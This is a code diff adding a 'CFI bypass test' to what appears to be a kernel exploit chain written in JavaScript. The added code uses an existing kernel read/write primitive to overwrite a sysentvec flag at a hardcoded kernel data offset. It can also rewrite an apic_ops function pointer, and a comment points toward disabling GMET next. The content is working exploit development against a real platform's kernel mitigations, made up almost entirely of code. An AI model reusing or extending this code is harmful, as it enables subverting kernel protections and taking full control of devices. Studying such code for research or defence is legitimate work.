@@ -808,6 +808,103 @@ async function main(userlandRW, wkOnly = false) {
 
             await log("========== ANALYSIS COMPLETE ==========", LogLevel.SUCCESS);
 
+            // =========================================================================
+            // CFI BYPASS TEST: Write to non-function-pointer data (sysentvec flag)
+            // The mystery flag at offset 0xD11D08 is a small integer (0x00000001),
+            // NOT a function pointer. CFI should only protect function pointer writes.
+            // If we can write to this without crashing, data-only attacks are viable!
+            // =========================================================================
+
+            const SYSENTVEC_MYSTERY_FLAG_OFFSET = 0xD11D08;
+
+            let doCfiBypassTest = confirm(
+                "CFI BYPASS TEST\n\n" +
+                "This will test writing to a NON-function-pointer field\n" +
+                "in the sysentvec structure at kdataBase+0xD11D08.\n\n" +
+                "Current theory: CFI only protects function pointer writes.\n" +
+                "If this write succeeds, data-only attacks are possible!\n\n" +
+                "The value at this offset is 0x00000001 (a flag/integer).\n\n" +
+                "OK = Run CFI bypass test\n" +
+                "Cancel = Skip"
+            );
+
+            if (doCfiBypassTest) {
+                await log("========== CFI BYPASS TEST ==========", LogLevel.SUCCESS);
+
+                // Read current value
+                let flagAddr = krw.kdataBase.add32(SYSENTVEC_MYSTERY_FLAG_OFFSET);
+                let currentFlag = await krw.read4(flagAddr);
+                await log("[CFI TEST] Address: kdataBase + 0x" + SYSENTVEC_MYSTERY_FLAG_OFFSET.toString(16), LogLevel.INFO);
+                await log("[CFI TEST] Current value: 0x" + currentFlag.toString(16), LogLevel.INFO);
+
+                // Also read surrounding context
+                await log("[CFI TEST] Reading surrounding context...", LogLevel.INFO);
+                await hexdump_kdata(SYSENTVEC_MYSTERY_FLAG_OFFSET - 16, 64, "Context around mystery flag");
+
+                // Test 1: Write to the integer flag (should succeed if CFI only protects function pointers)
+                let newFlagValue = currentFlag ^ 0x100; // Toggle a bit
+                await log("[CFI TEST] Attempting to write 0x" + newFlagValue.toString(16) + " to flag...", LogLevel.WARN);
+
+                try {
+                    await krw.write4(flagAddr, newFlagValue);
+                    let verifyFlag = await krw.read4(flagAddr);
+
+                    if (verifyFlag === newFlagValue) {
+                        await log("[CFI TEST] SUCCESS! Write to non-function-pointer succeeded!", LogLevel.SUCCESS);
+                        await log("[CFI TEST] This proves CFI only protects function pointers!", LogLevel.SUCCESS);
+                        await log("[CFI TEST] Data-only attacks ARE possible!", LogLevel.SUCCESS);
+
+                        // Restore original value
+                        await krw.write4(flagAddr, currentFlag);
+                        let restored = await krw.read4(flagAddr);
+                        await log("[CFI TEST] Restored original value: 0x" + restored.toString(16), LogLevel.INFO);
+                    } else {
+                        await log("[CFI TEST] Write appeared to succeed but value is 0x" + verifyFlag.toString(16), LogLevel.WARN);
+                    }
+                } catch (e) {
+                    await log("[CFI TEST] Write FAILED with error: " + e, LogLevel.ERROR);
+                    await log("[CFI TEST] CFI may protect ALL writes, not just function pointers", LogLevel.ERROR);
+                }
+
+                // Test 2: For comparison, show what happens when trying to write to a function pointer
+                // We'll read a function pointer from apic_ops but NOT write to it (just show the address)
+                const APIC_OPS_OFFSET = 0x170650;
+                let apicOpsAddr = krw.kdataBase.add32(APIC_OPS_OFFSET);
+                let firstFuncPtr = await krw.read8(apicOpsAddr);
+                await log("[CFI TEST] For comparison - apic_ops first function pointer:", LogLevel.INFO);
+                await log("[CFI TEST]   Address: kdataBase + 0x" + APIC_OPS_OFFSET.toString(16), LogLevel.INFO);
+                await log("[CFI TEST]   Value: " + firstFuncPtr, LogLevel.INFO);
+
+                let testApicWrite = confirm(
+                    "DANGEROUS: Test writing to apic_ops function pointer?\n\n" +
+                    "This will attempt to write the SAME value back to the\n" +
+                    "first function pointer in apic_ops.\n\n" +
+                    "If CFI is active, this WILL crash the system!\n\n" +
+                    "Only do this if you want to confirm CFI blocks function pointer writes.\n\n" +
+                    "OK = Try (will likely crash!)\n" +
+                    "Cancel = Skip (recommended)"
+                );
+
+                if (testApicWrite) {
+                    await log("[CFI TEST] Attempting to write to apic_ops function pointer...", LogLevel.ERROR);
+                    await log("[CFI TEST] If this crashes, CFI is blocking function pointer writes!", LogLevel.WARN);
+
+                    try {
+                        // Write the SAME value back - if CFI checks on write, even this will crash
+                        await krw.write8(apicOpsAddr, firstFuncPtr);
+                        await log("[CFI TEST] Write completed! CFI may not be active here!", LogLevel.SUCCESS);
+
+                        // Verify
+                        let verifyPtr = await krw.read8(apicOpsAddr);
+                        await log("[CFI TEST] Verified value: " + verifyPtr, LogLevel.INFO);
+                    } catch (e) {
+                        await log("[CFI TEST] Write failed with error: " + e, LogLevel.ERROR);
+                    }
+                }
+
+                await log("========== CFI TEST COMPLETE ==========", LogLevel.SUCCESS);
+            }
+
             // EXPERIMENTAL: Try to modify the SVM feature cache to disable GMET
             // Offset 0x4bf0 appears to contain cached CPUID SVM features
             // Value 0x740f12 has bit 18 (GMET) set
